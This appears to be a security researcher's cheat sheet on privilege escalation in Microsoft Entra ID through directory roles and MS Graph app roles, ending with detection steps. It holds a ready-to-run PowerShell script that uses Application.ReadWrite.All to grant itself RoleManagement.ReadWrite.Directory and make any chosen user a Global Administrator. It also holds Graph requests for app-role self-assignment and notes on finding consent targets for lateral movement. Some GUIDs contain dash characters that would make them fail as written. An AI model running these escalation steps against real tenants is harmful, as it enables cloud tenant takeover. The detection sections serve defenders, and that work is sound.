# Roles and Perms that allow adding a new credential to any application

EntraID Roles:

- Application Administrator
- Cloud Application Administrator
- Directory Synchronization Accounts
- Global Administrator
- Hybrid Identity Administrator 
- Partner Tier2 Support
- Privileged Role Administrator

# Roles and App Roles that allow elevation of any prcincipal to privleged roles

EntraID Roles:

- Global Administrator
- Partner Tier2 Support
- Privileged Role Administrator

MSGraph app Roles:

- AppRoleAssignment.ReadWrite.All
- RoleManagement.ReadWrite.Directory

# Creating a user 

EntraID Roles:

- Global Administrator
- Directory Writers
- User Administrator
- Partner Tier1 Support
- Partner Tier2 Support

MSGraph app Roles:

- Directory.ReadWrite.All
- User.ReadWrite.All


# OAuth / MS Graph

These globally unique identifiers (GUIDs) correspond the following dangerous MS Graph app roles:

```bash
1bfefb4e-e0b5–418b-a88f-73c46d2cc8e9 — Application.ReadWrite.All
06b708a9-e830–4db3-a914–8e69da51d44f — AppRoleAssignment.ReadWrite.All
19dbc75e-c2e2–444c-a770-ec69d8559fc7 — Directory.ReadWrite.All
62a82d76–70ea-41e2–9197–370581804d09 — Group.ReadWrite.All
Dbaae8cf-10b5–4b86-a4a1-f871c94c6695 — GroupMember.ReadWrite.All
9e3f62cf-ca93–4989-b6ce-bf83c28f9fe8 — RoleManagement.ReadWrite.Directory
89c8469c-83ad-45f7–8ff2–6e3d4285709e — ServicePrincipalEndpoint.ReadWrite.All
```

## Dangerous Actions each Role Enables

Here is a table with the roles and app roles and what they can do.

![Role Abuse Chart](/images/RoleAbuse.png)

Most Dangerous: 
    - RoleManagement.ReadWrite.Directory
    - AppRoleAssignment.ReadWrite.All

if you identify a service principal with either of those app roles, you have identified a service principal that has the equivalent of Global Administrator in your tenant.





## Consent Grant - Find Users who can Consent to Apps

Permission required to consent to OAuth apps, can search the tenant from a foothold to find targets for lateral movemment.

- "ManagePermissionGrantsForSelf.microsoft-user-default-legacy"

```powershell
Import-Module AzureADPreview
$passwd = ConvertTo-SecureString "$pass" -AsPlainText -Force 

$creds = New-Object System.Management.Automation.PSCredential ("$email", $passwd) 

Connect-AzureAD -Credential $creds 
  (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```


## Abuse Application.ReadWrite.All To Add User to GLobal Admin Role
Requires a service principal with Application

```powershell
# Create a self signed certificate
$AppDisplayName = "Abuse of API Permissions"
$cert = New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -Subject "CN=$($AppDisplayName)" -KeySpec KeyExchange -NotAfter (Get-Date).AddDays(2)
Export-Certificate -Cert $cert -FilePath ~\Downloads\AppRoleAssignment.cer

# Sign in with the user that has owner permissions and add the exported public certificate as a secret to the app registration

# Modify the following variables to match your environment
$ClientId = "GUID"
$servicePrincipalId = "GUID"
$TenantId = "GUID"
$TargetUserUPN = "UPNOfAnyUser" # Will be GA at the end of this script

# Connect as the application using the the certificate as a secret 
Connect-MgGraph -ClientId $ClientId -CertificateThumbprint $cert.Thumbprint -TenantId $TenantId

# Check you permission scopes
Get-MgContext

# Add additional permissions to the app
$appRoleAssignments = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$servicePrincipalId/appRoleAssignments"  | Select-Object -ExpandProperty value
$params = @{
    principalId = $servicePrincipalId
    resourceId  = $appRoleAssignments.resourceId
    appRoleId   = "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" # RoleManagement.ReadWrite.Directory
}
Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$servicePrincipalId/appRoleAssignments" -Body $params
$params = @{
    principalId = $servicePrincipalId
    resourceId  = $appRoleAssignments.resourceId
    appRoleId   = "df021288-bdef-4463-88db-98f22de89214" # User.Read.All
}
Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$servicePrincipalId/appRoleAssignments" -Body $params

# Reconnect to apply the new API permissions
Disconnect-MgGraph
Connect-MgGraph -ClientId $ClientId -CertificateThumbprint $cert.Thumbprint -TenantId $TenantId

# Check the scopes again
Get-MgContext

# Get UserId for the user
$TargetUser = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/users/$TargetUserUPN"

# Add the user to the global admin role
$Reference = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/" + $TargetUser.id }
Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $Reference -ContentType "application/json"

```


## Two Tenant Microsoft OAuth Hack

- Blog: https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc

A "legacy test app" in one tenant, production tenant in the other. A legacy app in test tenant with a service principal registered in production tentnat, a new user for consent. 
A service principal in one tenant with the AppRoleAssignment.ReadWrite.All app role can grant itself any app role and bypass the consent process. 
AppRoleAssignment.ReadWrite.All Can grant itself Directory.ReadWrite.All, not the other way around, though. If we have created a malicious app registration, we can use the newly created user to consent to the new application. If the app does not request admin rights, standard user can consent to the app and a service principal in your target tenant will be associated with the registration. This allows us to add credentials to the app registration in the test tenant but use the associated service principals created in the prod tenant to authenticate in the prod tenant. Attacker granted the "legacy test app" the EWS app role 'full_access_as_app'. This requires a POST request to the 'appRoleAssignedTo MS Graph API endpoint'.

# Service Principal Granting Service Principals Admin Permissions 
# Service Principals cannot access this in the AAD Graph API, just MS Graph
# Roles: Global Admin, Partner Tier2 Support, Privileged Role Admin
# AppRoles: AppRoleAssignment.ReadWrite.All
# ElevationRoles: RoleManagement.ReadWrite.All (SP with this role can assign itself the other roles) 

```bash
POST https://graph.microsoft.com/v1.0/servicePrincipals/9028d19c-26a9-4809-8e3f-20ff73e2d75e/appRoleAssignedTo
Content-Type: application/json

{
  "principalId": "33ad69f9-da99-4bed-acd0-3f24235cb296",
  "resourceId": "9028d19c-26a9-4809-8e3f-20ff73e2d75e",
  "appRoleId": "ef7437e6-4f94-4a0a-a110-a439eb2aa8f7"
}
```

```powershell
Import-Module Microsoft.Graph.Applications

$params = @{
	principalId = "33ad69f9-da99-4bed-acd0-3f24235cb296"
	resourceId = "9028d19c-26a9-4809-8e3f-20ff73e2d75e"
	appRoleId = "ef7437e6-4f94-4a0a-a110-a439eb2aa8f7"
}

New-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $servicePrincipalId -BodyParameter $params
```

#### Detect and Control

```powershell
$Graph = "00000003–0000–0000-c000–000000000000"

# Query Service Principals that have MS Graph roles

# Query the specific role granted (have to use devtools in the portal)
# Find and click on the “GET” request that was made to “AppRoleAssignments”
AppRoleAssignments?searchText=

# Copy response payload into text editor, search for the dangerous GUIDs

# Query that service principal by name, find the tenant ID
#  The Azure GUI will not show you the tenant ID of the service principal; open your browser developer tools again and click on “Roles and administrators”, then find and click on the GET request to “getByIds”, and click on “Response” 
appOwnerOrganizationId

$TrueOwner = "<VALUE OF APPOWNER ORGID>"

# Compare the apps tenant ID with this value, see if this is an external application with those high privileges

```

- Id service principals with dangerous MSGraph roles 
- Get the RoleAssignment API response  
- Determine if priv role assigned
- Check the principals AppOwnerOrgId against your tenant ID
- Evaluate if the app permissions make sense or if the application is malicious. 
 
### Bark
Can use BARK to query for these using a service principal with Directory.Read.All

- Post: https://posts.specterops.io/automating-azure-abuse-research-part-1-30b0eca33418
- Post: https://specterops.io/blog/2022/08/31/automating-azure-abuse-research-part-2/

```powershell
# Get Token
$MSGraphToken = (Get-MSGraphTokenWithClientCredentials `
    -ClientID "$appId" `
    -ClientSecret "$secret" `
    -TenantName 'FabrikamProdTenant.onmicrosoft.com').access_token

# Get-TierZeroServicePrincipals function to retrieve all service principals that have the highest privilege Entra ID roles and MS Graph app roles:
Get-TierZeroServicePrincipals -Token $MSGraphToken

# To ID the foreign ones, show only SP ID, displayname and TenantID
Get-TierZeroServicePrincipals -Token $MSGraphToken | Select ServicePrincipalID | Sort-Object -Unique -Property ServicePrincipalID | %{
    Get-AzureADServicePrincipal `
        -Token $MSGraphToken `
        -ObjectID $_.ServicePrincipalID | Select id,appDisplayName,appOwnerOrganizationId
}
```
